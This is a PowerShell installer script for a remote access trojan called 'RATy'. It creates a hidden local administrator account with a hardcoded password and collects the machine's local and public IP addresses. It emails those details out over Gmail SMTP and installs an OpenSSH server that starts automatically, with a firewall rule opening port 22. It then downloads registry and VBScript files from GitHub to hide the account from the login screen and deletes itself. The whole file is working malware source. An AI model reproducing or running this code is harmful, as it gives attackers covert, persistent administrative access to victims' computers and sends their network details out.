# BUILD RESOURCES FOR RAT
# CREATED BY : Mohid Mughal

# Random string creator to create names for files
function random_text {
    return -join((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}


### Disable Win Defender and get ep (execution policy) bypass
###

######################################################################################
# Function to Create Local Admin for RATy
function create_account {
    [CmdletBinding()]

    param (
        [string] $uname,
        [securestring] $pword
    )
    
    begin {
    }
    
    process {
        New-LocalUser -Name "$uname" -Password $pword -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user craeted" 
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"
    }
    
    end {
    }
}

#Creates Admin User
Remove-LocalUser -Name "WinGuest"  # Remove the user in case it already exists
$uname = "WinGuest"  # Username for the newly created LocalAdmin
$pword = (ConvertTo-SecureString "RATy" -AsPlainText -Force)  # Password for the Newly Created LocalAdmin
create_account -uname $uname -pword $pword   # Creates LocalAdmin on getters end
######################################################################################


#  VARIABLES
# FOR Working Directory names, inside Temp Directory of Windows
$wd = random_text    # creates and store a string of random characters inside $wd (working directory) which can be later given to a file as "name"
$workingDirectoryInTemp = "$env:temp\$wd"    # path of the folder in temp directory in which we will store our RAT related files
$initial_dir = Get-Location    # for storing the current directory we are in OR where the 'installer.ps1' file is placed, will be used for self deleting 'installer.ps1' file in the end - 'Get-Location' in .ps1 == '%cd%' in .cmd
echo $workingDirectoryInTemp
$configFile = Join-Path (Get-Location) "$env:UserName.rat"
$LocalEthernetIP = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
$LocalWifiIP = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Wi-fi).IPAddress
$GlobalPublicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()

Add-Content -Path $configFile -Value $LocalWifiIP   # If the getter PC is using internet via Wifi, use this for ssh
Add-Content -Path $configFile -Value "RATy"  # Adding Password of the new admin we created
Add-Content -Path $configFile -Value $workingDirectoryInTemp  # directory in TEMP which we created(store RATy file)
Add-Content -Path $configFile -Value $LocalEthernetIP  # If the getter is accessing Internet via Ethernet, use this
Add-Content -Path $configFile -Value $GlobalPublicIP

# SENDING Getter Details (Configurations) to Sender via SMTP/eMail
##########################################################################
# Define SMTP server and port (Gmail SMTP example)
$smtpServer = "smtp.gmail.com"
$smtpPort = 587

# PUT sender and recipient details
$senderEmail = "yourAddress@gmail.com"
$recipientEmail = "yourAddress@gmail.com"
$subject = " {New} Test Email from $env:UserName"
$body = "This is a test email sent from ps1 using mail SMTP."

# PUT the App Password (generated after enabling 2FA)
$appPassword = "16-Digit-App-Password"  # Use the app-specific password

# Create the SMTP client
$mailmessage = New-Object system.net.mail.mailmessage
$mailmessage.from = ($senderEmail)
$mailmessage.To.add($recipientEmail)
$mailmessage.Subject = $subject
$mailmessage.Body = $body


# Create the attachment object and add it to the email
$attachment = New-Object System.Net.Mail.Attachment($configFile)
$mailmessage.Attachments.Add($attachment)

# Configure the SMTP client and authenticate using the App Password
$smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($senderEmail, $appPassword)

# Send the email
$smtp.Send($mailmessage)

Write-Host "Email sent successfully!"

# Disposing the attachment object in order to release the file/proccess lock - otherwise we couldnt be able to delete the file
$attachment.Dispose()
######################################################################

Start-Sleep -Milliseconds 500
Remove-Item $configFile -Force  # Remove the file containing Configuration


# GOTO TEMP Directory and do the Magic
mkdir $workingDirectoryInTemp   # creates a folder inside temp directory with the name stored in the $wd variable (name will be a string of random characters)
cd $workingDirectoryInTemp    # moves to our own created folder inside temp directory of windows


# Invoke Persistent SSH
###########################################################################################
# Will Install OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Will Start the Server after Download and Install (automatic in background) || -Name sshd  -- means that the sshd service shoud start
# sshd (Sexure Shell Daemon) is a server side prigram that looks for and handles incoming ssh requests - authenticating them and establishing ssh connections
Start-Service -Name sshd

# It will make sure that the SSH service starts automatically when the PC restarts
Set-Service -Name sshd -StartupType Automatic

# It will CHECK if a firewall rule for SSH connections exists - and '$sshRule' will ahve value NULL in case no SSH rule is found
$sshRule = Get-NetFirewallRule -Name *ssh* -ErrorAction SilentlyContinue

# If in case no rule exists, it will create a new firewall rule to allow SSH traffic
if (-not $sshRule) {
    Write-Host "No SSH firewall rule found. Creating one..."
    New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "Allow SSH" `
        -Enabled True -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
} else {
    Write-Host "SSH firewall rule already exists."
}
###########################################################################################


# Getting Registry file (that will make some changes in WIN Reg to make sure that the newly created user doesnt show on Login Screen when the user starts his PC) and Code to run it automatically (Confirming the changes in registry)
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/ServiceModelWinRegConfig.reg' -OutFile 'ServiceModelWinRegConfig.reg' "
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/confirm.vbs' -OutFile 'confirm.vbs' "


# Install/Run the Registry && conformation code HERE
./ServiceModelWinRegConfig.reg ./confirm

# if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
###

# A humble try to hide the Newly Created User (WinGuest) from the
cd $env:USERPROFILE
cd..
attrib +h +s +r WinGuest   # Marks the file as Hidden, System & Read Only File

#Same as PAUSE command in .cmd
Read-Host "Wanna delete 'installer.ps1'? Press any key to continue"

# self delete
cd $initial_dir
del installer.ps1